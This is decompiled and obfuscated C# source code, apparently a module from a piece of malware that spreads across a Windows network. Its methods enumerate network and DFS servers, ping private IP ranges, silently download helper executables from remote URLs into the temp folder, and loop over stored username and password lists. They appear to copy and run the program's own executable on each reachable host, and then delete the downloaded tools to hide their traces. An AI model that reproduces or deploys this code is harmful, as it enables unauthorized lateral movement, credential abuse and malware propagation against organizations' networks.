using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace CXUnSAPANzkE;

internal sealed class yQTswOXiTELR
{
	public sealed class oUXBdjGkrzvAL
	{
		private string _003CServerName_003Ek__BackingField;

		public string ServerName
		{
			get
			{
				return _003CServerName_003Ek__BackingField;
			}
			set
			{
				_003CServerName_003Ek__BackingField = value;
			}
		}
	}

	public enum GNGyGoZvnEtSW
	{
		uKycDEWfgtmS = 1,
		xSiyVTGqxFfo,
		XNgbcXxCIQWV,
		yBbeSDODYlVfwXl,
		VjHgHqljVEiByuJ
	}

	public enum otpRlEoFBjrP
	{
		jLsnIxgkOICW,
		BrzibxxUHTqCRH,
		nDvKUTGsxU,
		yBlYDBDpXJe
	}

	public enum jfBDnrCLwhSyXX
	{
		qdAppWYuNtlg = 1,
		wmHngBvnSGYZZRh = 2,
		swRXBbLNjkLJ = 4,
		xvIIEXdLxod = 8,
		XdNQcsMcEkv = 16,
		tnnIayOplqT = 19
	}

	public enum JaiZZywDZVa
	{
		LNUXoiUJeF,
		ZFlMvRMmiPOSdpMSqN,
		UsvpuLEDSVdGb,
		XwOhFxdVVseF,
		eNmbsLTszTCPWU,
		bBfVEardeuaM,
		ZnvIkzkTBSxPdm,
		UCFgUUSsowSJ,
		TObiNMyVJS,
		ObrbWBqlvixw,
		ryXyVCbpsk,
		tRxRbtiIPcb
	}

	public sealed class xZWcgFFKtqP : IEnumerable
	{
		private enum AlwBRgEVzdgeJ
		{
			igjKUewJikTYIb = 0,
			nqBcrVabHUxjmXKC = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class KaspdgcGLrQ
		{
			public GNGyGoZvnEtSW ITdjZyuLWrXHpWX;

			public otpRlEoFBjrP TkdZfiTcelVjc;

			public JaiZZywDZVa LRQGIJhgWAgvIi;

			public jfBDnrCLwhSyXX niDtOyPEcIeGiy;

			public string MgGMDIyyxNfnAP;

			public string DCUPzYWmnCud;

			public string JmSmgOupGAjEm;

			public string FhOCCwJUOgbdDFy;
		}

		private ArrayList bNNoAUDEJRqNzlJp = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern AlwBRgEVzdgeJ WNetOpenEnumA(GNGyGoZvnEtSW dwScope, otpRlEoFBjrP dwType, jfBDnrCLwhSyXX dwUsage, KaspdgcGLrQ p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern AlwBRgEVzdgeJ WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern AlwBRgEVzdgeJ WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(KaspdgcGLrQ kaspdgcGLrQ_0, GNGyGoZvnEtSW gngyGoZvnEtSW_0, otpRlEoFBjrP otpRlEoFBjrP_0, jfBDnrCLwhSyXX jfBDnrCLwhSyXX_0, JaiZZywDZVa jaiZZywDZVa_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(gngyGoZvnEtSW_0, otpRlEoFBjrP_0, jfBDnrCLwhSyXX_0, kaspdgcGLrQ_0, out lphEnum) == AlwBRgEVzdgeJ.igjKUewJikTYIb)
			{
				AlwBRgEVzdgeJ alwBRgEVzdgeJ;
				do
				{
					alwBRgEVzdgeJ = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (alwBRgEVzdgeJ)
					{
					case AlwBRgEVzdgeJ.nqBcrVabHUxjmXKC:
						continue;
					case AlwBRgEVzdgeJ.igjKUewJikTYIb:
						Marshal.PtrToStructure(intPtr, kaspdgcGLrQ_0);
						if (kaspdgcGLrQ_0.LRQGIJhgWAgvIi == jaiZZywDZVa_0)
						{
							bNNoAUDEJRqNzlJp.Add(kaspdgcGLrQ_0.DCUPzYWmnCud);
						}
						if ((kaspdgcGLrQ_0.niDtOyPEcIeGiy & jfBDnrCLwhSyXX.wmHngBvnSGYZZRh) == jfBDnrCLwhSyXX.wmHngBvnSGYZZRh)
						{
							EnumerateServers(kaspdgcGLrQ_0, gngyGoZvnEtSW_0, otpRlEoFBjrP_0, jfBDnrCLwhSyXX_0, jaiZZywDZVa_0);
						}
						continue;
					}
					break;
				}
				while (alwBRgEVzdgeJ != AlwBRgEVzdgeJ.nqBcrVabHUxjmXKC);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public xZWcgFFKtqP(GNGyGoZvnEtSW gngyGoZvnEtSW_0, otpRlEoFBjrP otpRlEoFBjrP_0, jfBDnrCLwhSyXX jfBDnrCLwhSyXX_0, JaiZZywDZVa jaiZZywDZVa_0)
		{
			KaspdgcGLrQ kaspdgcGLrQ_ = new KaspdgcGLrQ();
			EnumerateServers(kaspdgcGLrQ_, gngyGoZvnEtSW_0, otpRlEoFBjrP_0, jfBDnrCLwhSyXX_0, jaiZZywDZVa_0);
		}

		public IEnumerator GetEnumerator()
		{
			return bNNoAUDEJRqNzlJp.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct UvLIKmgCUto
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string hhRwBPslfniXw;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string dqAApzgKub;

		public uint xQUlRAeZiYq;

		public uint ZajGRknVlIQI;

		public IntPtr BMLThQranhVc;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct JmpDDJpJDGxsJc
	{
		public int xQUlRAeZiYq;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string dzKMvnFUUZOjJ;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string kCMLjPvvPqcN;
	}

	public struct cnUXlZfcJgeyIX
	{
		public string EfLSObHMyQDC;

		public string[] UJuEjwUhILuf;

		public cnUXlZfcJgeyIX(string string_0, string[] string_1)
		{
			EfLSObHMyQDC = string_0;
			UJuEjwUhILuf = string_1;
		}
	}

	private sealed class fyJsqpBukpr
	{
		public string hbmLldvMCejK;

		public string trmbEgfjWs;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__1(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107392908)) && !string_0.StartsWith(getString_0(107392935)) && !string_0.StartsWith(getString_0(107392926)) && !string_0.Contains(getString_0(107393764))) || !jfZgqqjrvPI(string_0))
			{
				return;
			}
			try
			{
				if (arFNxqUpEFyGtTT.lAoTEijSeOCrur == getString_0(107397061))
				{
					for (int i = 0; i < PnvVzbsgauow.Count; i++)
					{
						arFNxqUpEFyGtTT.dgFtyqbndoER(getString_0(107392881), getString_0(107392900) + string_0 + getString_0(107392891) + PnvVzbsgauow[i] + getString_0(107392846) + SpnhDMEosoca[i]);
						Thread.Sleep(1000);
					}
				}
				else
				{
					arFNxqUpEFyGtTT.dgFtyqbndoER(getString_0(107392881), getString_0(107392900) + string_0);
					Thread.Sleep(1000);
				}
			}
			catch
			{
			}
			if (arFNxqUpEFyGtTT.lAoTEijSeOCrur == getString_0(107397061))
			{
				for (int j = 0; j < PnvVzbsgauow.Count; j++)
				{
					if (arFNxqUpEFyGtTT.nCFuCxDDXURK)
					{
						if (File.Exists(hbmLldvMCejK))
						{
							arFNxqUpEFyGtTT.dgFtyqbndoER(hbmLldvMCejK, getString_0(107391396) + string_0 + getString_0(107404541) + PnvVzbsgauow[j] + getString_0(107404500) + SpnhDMEosoca[j] + getString_0(107404491) + Assembly.GetEntryAssembly()!.Location + getString_0(107391350));
						}
					}
					else if (File.Exists(trmbEgfjWs))
					{
						arFNxqUpEFyGtTT.dgFtyqbndoER(trmbEgfjWs, getString_0(107391396) + string_0 + getString_0(107404541) + PnvVzbsgauow[j] + getString_0(107404500) + SpnhDMEosoca[j] + getString_0(107404970) + Assembly.GetEntryAssembly()!.Location + getString_0(107391350));
					}
				}
			}
			else if (arFNxqUpEFyGtTT.nCFuCxDDXURK)
			{
				if (File.Exists(hbmLldvMCejK))
				{
					arFNxqUpEFyGtTT.dgFtyqbndoER(hbmLldvMCejK, getString_0(107391396) + string_0 + getString_0(107404913) + Assembly.GetEntryAssembly()!.Location + getString_0(107391350));
				}
			}
			else if (File.Exists(trmbEgfjWs))
			{
				arFNxqUpEFyGtTT.dgFtyqbndoER(trmbEgfjWs, getString_0(107391396) + string_0 + getString_0(107404880) + Assembly.GetEntryAssembly()!.Location + getString_0(107391350));
			}
		}

		static fyJsqpBukpr()
		{
			Strings.CreateGetStringDelegate(typeof(fyJsqpBukpr));
		}
	}

	private sealed class uLzXSxdHcup
	{
		public string aZsanEknJmuSHIHa;

		public bool _003CGetIPAddresses_003Eb__5(string string_0)
		{
			return string_0 != aZsanEknJmuSHIHa;
		}
	}

	public static List<string> lAXFGpvVLdXNC;

	public static string IuSDpIVEPpgRh;

	public static List<string> PnvVzbsgauow;

	public static List<string> SpnhDMEosoca;

	public static List<string> lpInoxfoeYwqhpr;

	[NonSerialized]
	internal static GetString getString_0;

	public static List<oUXBdjGkrzvAL> YvqUIYDAbcwub()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = getString_0(107396857);
			process.StartInfo.Arguments = getString_0(107405002);
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<oUXBdjGkrzvAL> list = new List<oUXBdjGkrzvAL>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == getString_0(107404953))
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new oUXBdjGkrzvAL
						{
							ServerName = getString_0(107396862) + stringBuilder.ToString() + getString_0(107405452)
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string NiqlyjWJqjtcVzcz, int fwKsOlXjZlZaa, int cNQLjzUWUr, out IntPtr rEqCqxkuFF, [MarshalAs(UnmanagedType.I4)] out int MmSlRioEeZBhx, [MarshalAs(UnmanagedType.I4)] ref int xZhpspkGwHbgktP);

	public static List<cnUXlZfcJgeyIX> GYJsMgzazLFuHpcc(string string_0)
	{
		try
		{
			List<cnUXlZfcJgeyIX> list = new List<cnUXlZfcJgeyIX>();
			IntPtr rEqCqxkuFF = default(IntPtr);
			int MmSlRioEeZBhx = 0;
			int xZhpspkGwHbgktP = 0;
			if (NetDfsEnum(string_0, 3, 268435455, out rEqCqxkuFF, out MmSlRioEeZBhx, ref xZhpspkGwHbgktP) == 0)
			{
				for (int i = 0; i < MmSlRioEeZBhx; i++)
				{
					UvLIKmgCUto uvLIKmgCUto = (UvLIKmgCUto)Marshal.PtrToStructure(rEqCqxkuFF + i * Marshal.SizeOf(typeof(UvLIKmgCUto)), typeof(UvLIKmgCUto));
					if (uvLIKmgCUto.hhRwBPslfniXw == string_0)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < uvLIKmgCUto.ZajGRknVlIQI; j++)
					{
						IntPtr ptr = new IntPtr(uvLIKmgCUto.BMLThQranhVc.ToInt64() + j * Marshal.SizeOf(typeof(JmpDDJpJDGxsJc)));
						JmpDDJpJDGxsJc jmpDDJpJDGxsJc = (JmpDDJpJDGxsJc)Marshal.PtrToStructure(ptr, typeof(JmpDDJpJDGxsJc));
						if (jmpDDJpJDGxsJc.xQUlRAeZiYq == 2)
						{
							list2.Add(Path.Combine(new string[3]
							{
								getString_0(107391339),
								jmpDDJpJDGxsJc.dzKMvnFUUZOjJ,
								jmpDDJpJDGxsJc.kCMLjPvvPqcN
							}));
						}
					}
					string text = uvLIKmgCUto.hhRwBPslfniXw.Replace(string_0, getString_0(107393707));
					if (text.StartsWith(getString_0(107396862)))
					{
						text = text.Substring(1);
					}
					list.Add(new cnUXlZfcJgeyIX(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void oQvRPnJsvHPWG()
	{
		arFNxqUpEFyGtTT.jtJLvUlPurQHRX(getString_0(107405443));
		List<oUXBdjGkrzvAL> list = YvqUIYDAbcwub();
		List<cnUXlZfcJgeyIX> list2 = GYJsMgzazLFuHpcc(Environment.MachineName);
		if (list2 != null)
		{
			foreach (cnUXlZfcJgeyIX item in list2)
			{
				string[] uJuEjwUhILuf = item.UJuEjwUhILuf;
				foreach (string text in uJuEjwUhILuf)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (arFNxqUpEFyGtTT.lAoTEijSeOCrur == getString_0(107397004))
						{
							for (int j = 0; j < PnvVzbsgauow.Count; j++)
							{
								arFNxqUpEFyGtTT.dgFtyqbndoER(getString_0(107392824), getString_0(107392703) + text + getString_0(107392834) + PnvVzbsgauow[j] + getString_0(107392789) + SpnhDMEosoca[j]);
							}
						}
						else
						{
							arFNxqUpEFyGtTT.dgFtyqbndoER(getString_0(107392824), getString_0(107392703) + text);
						}
						arFNxqUpEFyGtTT.PelwIoYLMluwkT.Add(text.Replace(getString_0(107391288), getString_0(107393707)));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (oUXBdjGkrzvAL item2 in list)
		{
			if (item2.ServerName.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (arFNxqUpEFyGtTT.lAoTEijSeOCrur == getString_0(107397004))
				{
					for (int k = 0; k < PnvVzbsgauow.Count; k++)
					{
						arFNxqUpEFyGtTT.dgFtyqbndoER(getString_0(107392824), getString_0(107392703) + item2.ServerName + getString_0(107392834) + PnvVzbsgauow[k] + getString_0(107392789) + SpnhDMEosoca[k]);
					}
				}
				else
				{
					arFNxqUpEFyGtTT.dgFtyqbndoER(getString_0(107392824), getString_0(107392703) + item2.ServerName);
				}
				arFNxqUpEFyGtTT.PelwIoYLMluwkT.Add(item2.ServerName.Replace(getString_0(107391288), getString_0(107393707)));
			}
			catch
			{
			}
		}
	}

	public static void DZCOnmaxvdxRUwq()
	{
		fyJsqpBukpr CS_0024_003C_003E8__locals0 = new fyJsqpBukpr();
		List<RiRQeTkjLxd> list = RiRQeTkjLxd.YjzJulptGLxZ();
		foreach (RiRQeTkjLxd item in list)
		{
			lAXFGpvVLdXNC.Add(item.IPAddress);
		}
		CS_0024_003C_003E8__locals0.hbmLldvMCejK = getString_0(107393707);
		CS_0024_003C_003E8__locals0.trmbEgfjWs = getString_0(107393707);
		try
		{
			CS_0024_003C_003E8__locals0.hbmLldvMCejK = FfOqfTdTMXZDXn();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.trmbEgfjWs = hFntIVqEDuDOsf();
		}
		catch
		{
		}
		foreach (RiRQeTkjLxd item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107392851)) || item2.IPAddress.StartsWith(getString_0(107392878)) || item2.IPAddress.StartsWith(getString_0(107392869)) || item2.IPAddress.Contains(getString_0(107393707)))
				{
					iIyXMMMQMsHYxn.jcMwDgAastS(item2.MacAddress, item2.IPAddress, getString_0(107405358));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(lAXFGpvVLdXNC, delegate(string string_0)
			{
				if ((string_0.StartsWith(fyJsqpBukpr.getString_0(107392908)) || string_0.StartsWith(fyJsqpBukpr.getString_0(107392935)) || string_0.StartsWith(fyJsqpBukpr.getString_0(107392926)) || string_0.Contains(fyJsqpBukpr.getString_0(107393764))) && jfZgqqjrvPI(string_0))
				{
					try
					{
						if (arFNxqUpEFyGtTT.lAoTEijSeOCrur == fyJsqpBukpr.getString_0(107397061))
						{
							for (int i = 0; i < PnvVzbsgauow.Count; i++)
							{
								arFNxqUpEFyGtTT.dgFtyqbndoER(fyJsqpBukpr.getString_0(107392881), fyJsqpBukpr.getString_0(107392900) + string_0 + fyJsqpBukpr.getString_0(107392891) + PnvVzbsgauow[i] + fyJsqpBukpr.getString_0(107392846) + SpnhDMEosoca[i]);
								Thread.Sleep(1000);
							}
						}
						else
						{
							arFNxqUpEFyGtTT.dgFtyqbndoER(fyJsqpBukpr.getString_0(107392881), fyJsqpBukpr.getString_0(107392900) + string_0);
							Thread.Sleep(1000);
						}
					}
					catch
					{
					}
					if (arFNxqUpEFyGtTT.lAoTEijSeOCrur == fyJsqpBukpr.getString_0(107397061))
					{
						for (int j = 0; j < PnvVzbsgauow.Count; j++)
						{
							if (arFNxqUpEFyGtTT.nCFuCxDDXURK)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.hbmLldvMCejK))
								{
									arFNxqUpEFyGtTT.dgFtyqbndoER(CS_0024_003C_003E8__locals0.hbmLldvMCejK, fyJsqpBukpr.getString_0(107391396) + string_0 + fyJsqpBukpr.getString_0(107404541) + PnvVzbsgauow[j] + fyJsqpBukpr.getString_0(107404500) + SpnhDMEosoca[j] + fyJsqpBukpr.getString_0(107404491) + Assembly.GetEntryAssembly()!.Location + fyJsqpBukpr.getString_0(107391350));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.trmbEgfjWs))
							{
								arFNxqUpEFyGtTT.dgFtyqbndoER(CS_0024_003C_003E8__locals0.trmbEgfjWs, fyJsqpBukpr.getString_0(107391396) + string_0 + fyJsqpBukpr.getString_0(107404541) + PnvVzbsgauow[j] + fyJsqpBukpr.getString_0(107404500) + SpnhDMEosoca[j] + fyJsqpBukpr.getString_0(107404970) + Assembly.GetEntryAssembly()!.Location + fyJsqpBukpr.getString_0(107391350));
							}
						}
					}
					else if (arFNxqUpEFyGtTT.nCFuCxDDXURK)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.hbmLldvMCejK))
						{
							arFNxqUpEFyGtTT.dgFtyqbndoER(CS_0024_003C_003E8__locals0.hbmLldvMCejK, fyJsqpBukpr.getString_0(107391396) + string_0 + fyJsqpBukpr.getString_0(107404913) + Assembly.GetEntryAssembly()!.Location + fyJsqpBukpr.getString_0(107391350));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.trmbEgfjWs))
					{
						arFNxqUpEFyGtTT.dgFtyqbndoER(CS_0024_003C_003E8__locals0.trmbEgfjWs, fyJsqpBukpr.getString_0(107391396) + string_0 + fyJsqpBukpr.getString_0(107404880) + Assembly.GetEntryAssembly()!.Location + fyJsqpBukpr.getString_0(107391350));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.hbmLldvMCejK))
			{
				File.Delete(CS_0024_003C_003E8__locals0.hbmLldvMCejK);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.trmbEgfjWs))
			{
				File.Delete(CS_0024_003C_003E8__locals0.trmbEgfjWs);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string FfOqfTdTMXZDXn()
	{
		if (IntPtr.Size == 8)
		{
			return cYHTfWsReLCehDCb(new Uri(arFNxqUpEFyGtTT.tjPFETNBnBMzUXk(getString_0(107405305))));
		}
		return cYHTfWsReLCehDCb(new Uri(arFNxqUpEFyGtTT.tjPFETNBnBMzUXk(getString_0(107405305))));
	}

	public static string hFntIVqEDuDOsf()
	{
		if (IntPtr.Size == 8)
		{
			return cYHTfWsReLCehDCb(new Uri(arFNxqUpEFyGtTT.tjPFETNBnBMzUXk(getString_0(107405256))));
		}
		return cYHTfWsReLCehDCb(new Uri(arFNxqUpEFyGtTT.tjPFETNBnBMzUXk(getString_0(107404635))));
	}

	public static bool jfZgqqjrvPI(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string cYHTfWsReLCehDCb(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107404562), getString_0(107393707)).Remove(0, 3) + getString_0(107404589);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> SAAqanTiYmNU()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107404580));
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item(getString_0(107404515)))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item(getString_0(107404470));
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			for (int j = 0; j < array4.Length; j++)
			{
				uLzXSxdHcup CS_0024_003C_003E8__locals0 = new uLzXSxdHcup();
				CS_0024_003C_003E8__locals0.aZsanEknJmuSHIHa = array4[j];
				if (CS_0024_003C_003E8__locals0.aZsanEknJmuSHIHa.Contains(getString_0(107404489)))
				{
					array = array.Where((string string_0) => string_0 != CS_0024_003C_003E8__locals0.aZsanEknJmuSHIHa).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}

	static yQTswOXiTELR()
	{
		Strings.CreateGetStringDelegate(typeof(yQTswOXiTELR));
		lAXFGpvVLdXNC = new List<string>();
		IuSDpIVEPpgRh = getString_0(107393707);
		PnvVzbsgauow = new List<string>();
		SpnhDMEosoca = new List<string>();
		lpInoxfoeYwqhpr = new List<string>();
	}
}
